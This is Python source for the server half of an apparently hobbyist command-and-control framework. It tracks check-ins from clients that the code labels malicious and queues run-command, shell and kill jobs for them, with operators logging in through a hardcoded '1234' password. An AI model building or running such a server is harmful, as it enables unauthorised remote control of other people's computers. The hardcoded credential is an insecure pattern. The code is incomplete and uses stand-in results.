import subprocess as sp
import socket
import threading
import time
import os
import random
import atexit
from datetime import datetime, timezone
import select

HEADER = 64
FORMAT = 'utf-8'

global_debug = True

class s_sock:
    ##########
    ## Main Thread/Class
    ##########
    def __init__(self):
        self.server_password = "1234"
    
    def socket_cleanup(self):
        #pass
        self.server.close()
    
    
    def start_server(self, ip, port):
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # this allows the socket to be reelased immediatly on crash/exit
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.ADDR = (ip,port)
        self.server.bind(self.ADDR)  
        atexit.register(self.socket_cleanup)
        
        self.server.listen()  
        
        self.clients = {}
        self.current_clients = []
        
        self.friendly_current_clients = []
        self.friendly_clients = {}

        
        
        ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
        while True:
            try:
                print("\nTOP OF CODE: listening...")
                self.conn, addr = self.server.accept()
                ##print("\\|/New Connection\\|/")
                
                ## Getting client id from the client, and the IP address
                self.ip_address = self.conn.getpeername()[0]
                
                print("Waiting for a response...")
                self.response = self.conn.recv(1024).decode().split("\\|/")
            
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                print("Client Disconnected")
            
            response_list = []
            for i in self.response:
                print(f"split response {i}") if global_debug else None
                ## stripping out weird carriage returns from windows clients
                ## SMiley face getting in the way, I think that's why nothing is being sent
                response_list.append(i.strip("\x01").strip("\x02").rstrip("☻"))
                        
            self.id = response_list[0]
            try:
                self.message = response_list[1]
            except:
                self.message = "none"
                print("list index out of range with self.message, setting to none") if global_debug else None
            
            print(f"\nID: {self.id}") if global_debug else None
            print(f"MSG: {self.message}") if global_debug else None
            
            ## interact with server, on first connection
            if self.id == "!_userlogin_!":
                print("PassSplit") if global_debug else None
                ##ex:
                ## !_userlogin_!\|/username//|\\password
                username, password = self.message.split("//|\\\\")

                # Password evaluation
                print(username, password)
                if self.password_eval(password):
                    print("PassEval") if global_debug else None
                    self.conn.send("0".encode())
                    print(f"Successful logon from {username}")

                    friendly_client_name = f"!!~{username}"

                    # Add to globals list if not there
                    if friendly_client_name not in self.friendly_current_clients:
                        self.friendly_current_clients.append(friendly_client_name)

                    ## start thread (Note, each thread dies when fclient disconnectes, thats
                    ## why a new thread is started)
                    self.friendly_clients[friendly_client_name] = s_friendlyclient()
                    globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]

                    # Create a new thread to handle the friendly client
                    friendly_thread = threading.Thread(
                        target=self.friendly_clients[friendly_client_name].friendly_client_communication,
                        args=(self.conn, self.ADDR, self.response, username)
                    )
                    friendly_thread.start()

                    print(f"DEBUG: f_client msg: {self.response}") if global_debug else None

                else:
                    print(f"Failed logon from {username}")
                    self.conn.send("1".encode())



            #elif self.id == "!_usercommand_!":
                #print("usercommand function")


            ## handling commands - ma ynot need this
            ## elif friendly_client_name in friendly_client_name_list:
                ## friendly_client_name.interact()
            elif self.id == "!_usercommand_!":
                print("usercomm")
                
            elif self.id in ["GET","POST","HEAD","TRACE"]:
                print("HTTP request... Filtering")

            
            ## Client filter, make this an elif somehow, so if nothing matches, it drops
            else:
                print("else") if global_debug else None
                ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
                client_name = "client_" + self.ip_address.replace(".", "_") + "_" + self.id
                ## If the client hasn't been seen before, create new client ID n stuff
                if client_name not in self.current_clients:
                    self.current_clients.append(client_name)
                    
                    ## creating object intance
                    self.client = s_perclient()

                    # adding the instance self.client to the self.clients dict
                    self.clients[client_name] = self.client
                    
                    ''' THis is what the dict looks like, each "name" is pointing at a class object
                    clients = {
                        "client_192_168_0_1_1": <s_perclient object at 0x7fda883e4c70>,
                        "client_192_168_0_2_1": <s_perclient object at 0x7fda883e4d00>,
                        "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
                    }
                    '''
                    ## adding athat dict to the global list, under the "client_name"
                    globals()[client_name] = self.client
                
                else:
                    ##errmsg here
                    pass

                ## TLDR, this is passing the ID, and Message recieved to the correct class & then that class handles it 
                thread = threading.Thread(target=self.client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))

                thread.start()  
    
    

    
    def password_eval(self, password) -> bool:
        ## decrypt pass
        if password == self.server_password:
            return True
        else:
            return False
        
################
## Friendly Clients
################  
class s_friendlyclient:

    def __init__(self):
        self.ClientConnectionError = "Err: 0x01 ClientConnectionError"
        self.InputNotUnderstood = "Err: 0x02 InputNotUnderstood"
        self.UnknownError = "Err: 0x0? uh... no idea..."
        
    def friendly_client_communication(self, conn, addr, message, username):
                
        self.conn = conn
        self.addr = addr
        self.ip = addr[0]
        self.port = addr[1]
        ## listens for command
        ## runs command_process
        ## returns result to friedly client
        print(f"DEBUG: friendly_client func, user: {username}") if global_debug else None
        #print(self.conn.recv(1024).decode())
            
        print(f"CONN: {self.conn}") if global_debug else None
            
        while True:
            '''
            ## This guy seems to be a tad flawed, not 100% sure what's up, other
            ## than that its killing the connectino cause the conn isnt working?
            ## Check if client is still connected
            client_alive, _, _ = select.select([self.conn], [], [], 0)
            if not client_alive:
                print("(s_freindltclient) Client disconnected")
                break'''
                
            ## Waiting on input from client, on a per thread/friedly client basis until disconnection
            ## diffeerent than malicious clients, as they are constantly checking in, this is a more
            ## consistent connection
            
            ## Ex Input:
            #!_usercommand_!\|/ryan//|\\get-data client_127.0.0.1 
            # action\|/username//|\\command
            raw_user_input = self.conn.recv(1024).decode()
            user_input = self.parse_msg_for_server(raw_user_input)
            
            print(raw_user_input)
            
            ## For readability:
            try:
                user_username = user_input[0]
                user_command = user_input[1]
            except:
                print("No input") if global_debug else None
                #user_username, user_command = "None"
                #break
            
            print(f"DEBUG: UserInput: {user_input}") if global_debug else None
            
            ## Receiveing message from server portion & running through filters
            print("Call Decision Tree") if global_debug else None
            
            self.server_decision_tree(user_command)


################
## Server Functions
################ 

    def server_decision_tree(self, message):
        ## Always gets clients b4 running
        self.current_clientlist = ""
        for var_name in globals():
            if var_name.startswith("client_"):
                ## Sanity check to turn var_name into a string just in case
                self.current_clientlist += f"{var_name}\n"
                
        if message == "clients":       
            if self.current_clientlist != "":
                self.send_msg(self.current_clientlist)
            else:
                self.send_msg("No Current Clients")

        ## need to find a way to get thesub shell as well
        elif message == "stats":
            pass
            ## Need: client instance name
            ## then. client_instance.stats
            
        #else:
            #self.send_msg(self.InputNotUnderstood)
        
        ## if nothing here is understood, pass to the client decision tree
        ## I couldn't think of any other (clean) way to do it
        else:
            self.client_decision_tree(message)
            #print("!!Client Exists!!") if global_debug else None

################
## Client Fucntions
################ 

## If the job is not meant for the server, it filters down to here.
## this interacts with the self.clients interact function, which sets jobs 
## for the event loop to do on heartbeats

## TLDR: This sets jobs or gets current data from the current selected client

#                           Action      Value    Target Client 
#requests look like this: set-heartbeat 15 client_127_0_0_1_FCECW


    def client_decision_tree(self, raw_message):
        message = self.parse_msg_for_client(raw_message)
        print(f"RawMSG: {raw_message}")
        print(f"Parsed Message: {message}")
        

        client_command = message [0]
        client_command_value = message [1]
        
        ## Name is always last
        client_name = message[-1]
        print(client_name)
        
        ## setting self.client to the client name passed by the fclient
        self.client = globals()[client_name]
        
        #print(self.client)
        #print(self.client.stats_heartbeats)
        #globals()[client_name] = self.client
        
        #if client exists check FIRST!
        if client_name in self.current_clientlist:
            pass
        else:
            print("Client not found... ")
            ##exit protocol
            #self.exit_protocol()

        # == Static, From Server, validated
        if client_command == "get-data":
            data = f"{self.client.data_list}"
            self.send_msg(data)
    
        # == Dynamic, To Client, validated
        elif client_command == "set-heartbeat":
            heartbeat_value = client_command_value
            print(heartbeat_value)
            
            
            self.client.interact("set-heartbeat", heartbeat_value)
            
            ## sanity check
            if self.client.current_job == f"set-heartbeat\\|/{heartbeat_value}":
                self.send_msg(f"Heartbeat queued to be set to: {heartbeat_value}\nuse 'get-data' to verify the change\nDevNote: Need to make sure this actually works.Not sure how self.heartbeat gets it value - I forogr")
            
            else:
                self.send_msg("Error setting heartbeat")


        # == Dynamic, To Client
        elif client_command == "run-command":
            command_value = client_command_value

            ## Sending back results of command run
            self.send_msg(self.client.interact("run-command", command_value))
        
        #else:
            #self.send_msg(self.InputNotUnderstood)

    def send_msg(self, message:str):
        try:
            ## encoding with global str_encode

            HEADERSIZE = 10

            message = f"{len(message):<{HEADERSIZE}}" + message
            print(message)
            print("---head--|msg->")

            #print(f"Message being sent back to fclient: {message}")
            encoded_response = str_encode(message)
            self.conn.send(encoded_response)
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            ## nuking the class on an error... could be better
            exit()
            
            #pass
            
    
    def parse_msg_for_server(self, raw_message) -> list:
        print(f"Raw Message: {raw_message}")  if global_debug else None
        
        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
        parsed_results_list = raw_message.replace("!_usercommand_!\\|/","").split("//|\\\\")
        
        print(f"Parsed Message: {parsed_results_list}") if global_debug else None
        
        return parsed_results_list
    
    def parse_msg_for_client(self, raw_message) -> list:
        print(f"Raw Message: {raw_message}")  if global_debug else None
        
        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
        parsed_results_list = raw_message.split()
        
        print(f"Parsed Message: {parsed_results_list}") if global_debug else None
        return parsed_results_list

    ## meant for closing the connection
    def exit_protocol(self):
        self.conn.close()


#################################
## Per (malicious) Client Class
################################

class s_perclient:
    def __init__(self):
        self.first_time = 0
        # setting current job to none to start
        self.current_job = None

        ## stats
        self.stats_heartbeats = 0
        self.stats_heartbeat_timer = 15
        self.stats_jobsrun = 0
        self.stats_latestcheckin = 0
        ## all the data in one spot


################
## EventLoop
################ 

    def handle_client(self, conn, addr, message, id):
        
        self.conn = conn
        self.addr = addr
        self.ip = addr[0]
        self.port = addr[1]
        self.id =  id
        
        self.data_list = [
            self.stats_heartbeats,
            self.stats_heartbeat_timer,
            self.stats_jobsrun,
            self.stats_latestcheckin
        ]
        
        ## Sending message back to client that connection is ok
        #self.send_msg("ok")
        print(f"message: {message}") if global_debug else None
    
        while message:
            #print(f"First Time {self.first_time}")
            
                # Receive/Listen for message from client
            #received_msg = conn.recv(1024).decode()   
            #print(received_msg)            
            
            ## Receiveing message from server portion & running through filters
            print("Call Decision Tree") if global_debug else None
            self.decision_tree(message)
            
            ## setting message to none so this waits for a message b4 looping
            
            
            if not message:
                # Client has closed the connection, exit the loop

                print("Conn Closed\n\n") if global_debug else None
                break
            
            message = None

            # Process the received message
            #self.decision_tree(received_msg)
            
        # Close the connection when the loop is over
        conn.close()
    
    def decision_tree(self, received_msg):
        print(f"decision tree called, message recieved: {received_msg}") if global_debug else None
        
        print(f"MSG: {received_msg}, ID: {self.id}") if global_debug else None
        
        ## received_msg should always be ID. If not, either the client is fucked up
        ## or someone is trying to get access to the server 
        ## If a legit message (command output etc) is being sent back, received_msg[0] and 1 should be true and not equal eachother
        if received_msg[0] == self.id:
            print(f"Recieved heartbeat from {self.ip}") if global_debug else None
            ## +1 to heartbeat
            self.stats_heartbeats = self.stats_heartbeats + 1
            self.stats_latestcheckin = str(datetime.now(timezone.utc))

            ## check current_job, & send job ONLY on heartbeat

            if self.current_job != None:
                print(f"Sending Current Job: {self.current_job}") if global_debug else None
                ## sending job
                self.send_msg(self.current_job)

                ## nested if...
                if self.current_job != "wait":
                    ## stats
                    self.stats_jobsrun = self.stats_jobsrun + 1

                ## resetting values
                self.cleanup()
                print(f"Current Job on server side: {self.current_job}") if global_debug else None

            else:
                ## sending wait anyways just to cover my ass incase something goes wrong on the client side
                self.current_job = "wait\\|/wait"
                self.send_msg(self.current_job)
                print("No Current Job available, client will sleep\n\n") if global_debug else None
        ## cover my ass
        else:
            print(f"!! WARNING: There was an attempt to connect to server without an ID!\nMessage sent was: {received_msg}")
    
    ## This part is what the user interacts with, and it sets self.current_job based on the decision. 
    
    ## Self.job executes/gets sent out when the client recieves a heartbeat

################
## Direct comm with friendly client
################ 

#flow: friendly-client -> s_friendlyclient -> client.interact(this function) -> EventLoop
## Basically, friendly client talks to this function, which sets jobs n stuff,
# and then the event loop reads it/deals with it on heartbeats
## I need to draw this out too


    ## This is what gets interacted with by the friendly client
    def interact(self, user_input_raw, command_value=None):
        ## Action categpries: set (sets a paramter), run (runs something), info (gets info)
        user_input = user_input_raw.lower()
        
        if user_input == "jobs":
            print(
            "Jobs: \n" \
            "home - takes you to the initial client (aka home) screen\n" \
            "run-command - 'Runs a command (does not return output... yet)'\n" \
            "set-heartbeat - Sets the heartbeat of the client\n" \
            "kill - Kills the client (does not delete... yet)\n" \
            )

        elif user_input == "run-command":
            #command = input("Enter command: ")
            self.current_job = f"run-command\\|/{command_value}"
            #return results of that job
            return f"standin-command-results, command run: {command_value}"
            
        elif user_input == "shell":
            self.current_job = "shell\\|/shell"
        
        elif user_input == "wait":
            self.current_job = "wait\\|/wait"
            
        elif user_input == "set-heartbeat":
            #new_heartbeat = input("What is the new heartbeat? (seconds, ex 300): ")
            new_heartbeat = command_value
            self.current_job = f"set-heartbeat\\|/{int(new_heartbeat)}"

        elif user_input == "kill":
            ## add additional actions like shutdown, or crash PC in the command slot
            #new_heartbeat = input("What is the new heartbeat? (seconds, ex 300): ")

            self.current_job = f"kill\\|/kill"        

        elif user_input == "current_job":
            print(self.current_job.strip("\\|/"))
            
        elif user_input == "":
            print("No input provided!")
        
        else:
            print("Job does not exist - type 'jobs' for jobs")
            self.current_job == "none"
            
    def cleanup(self):
        self.current_job = "wait\\|/wait"
        
    def send_msg(self, message):
        print(f"Message being sent to cleint: {message}") #if global_debug else None
        ##Test >1024


        self.conn.send(message.encode())
        
        
        ## wasn't running as it was waiting for a response
        #recieve_msg = self.conn.recv(1024).decode()
        #return recieve_msg
    ## def send_cmd():
    ## this one will be for sending & receiving one off comamnds,
    ## seperate due to the recieve msg
        #recieve_msg = self.conn.recv(1024).decode()
        #return recieve_msg

################
## QOL Functions
################
## bytes -> str
def str_decode(input) -> str:
    decoded_result = input.decode()
    return decoded_result

## str -> bytes
def str_encode(input) -> bytes:
    encoded_result = input.encode()
    return encoded_result
    
    
if __name__ == "__main__":
    ## could listen on multiple ports with threading this whole thing
    SERV = s_sock()

    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',101))
    background_listen.start() 
    print("server started")
    
    #SERV.start_server('0.0.0.0',8092)
    
    #SERV.client_interact()